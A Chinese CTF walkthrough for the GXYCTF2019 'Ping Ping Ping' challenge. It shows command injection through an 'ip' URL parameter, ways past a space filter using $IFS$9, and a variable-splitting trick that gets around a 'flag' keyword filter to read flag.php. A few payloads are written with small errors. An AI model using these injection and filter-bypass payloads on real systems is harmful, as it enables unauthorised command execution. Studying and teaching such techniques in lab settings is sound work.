# [GXYCTF2019]Ping Ping Ping

知识点:  **远程代码执行**

1. 根据提示 , url 有参数 ip

![image-20230406070045566](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230406070045566.png)



2. 可以用 `;  或者 |` 来闭合前面的命令.尝试 `ls访问:

```shell
http://a5-5a1e-4c54-acfc289.node4.buuoj.cn:81/?ip=127.0.0.1;ls
```

![image-20230406070321946](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230406070321946.png)



依次尝试了下面的方法:

 `cat flag.php`  

`cat%20%{IF}index.php`

`echo$IFSflag.php`

显示如下, 说明过滤了空格

![image-20230406070354020](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230406070354020.png)

![image-20230406070826096](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230406070826096.png)

![image-20230406071321372](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230406071321372.png)



可能还有其他过滤, 此处知道了几个过滤, 而 `空格过最为常见, 所以此处针对空格进行绕过`, 输入下方的命令, 查看 `index.ph`.

`cat$IFS$9index.php`

![image-20230406072039329](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230406072039329.png)

> 通过观察, 可以看到 `flag 这四个 字母被正则匹配并过滤掉了`

可以通过一下两种方式来查看flag.php

1. `cat$IFS%9'ls'` , 之后显示的页面还是过滤规则的页面, **右键查看源代码, 就可以看到flag 在注释里面.**

2. 还有一种方式是: `w=g;cat$IFSfla$w.php`, **也就是将 w 复制为 g**

   这样就可以如果啦

   ![image-20230406073355987](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230406073355987.png)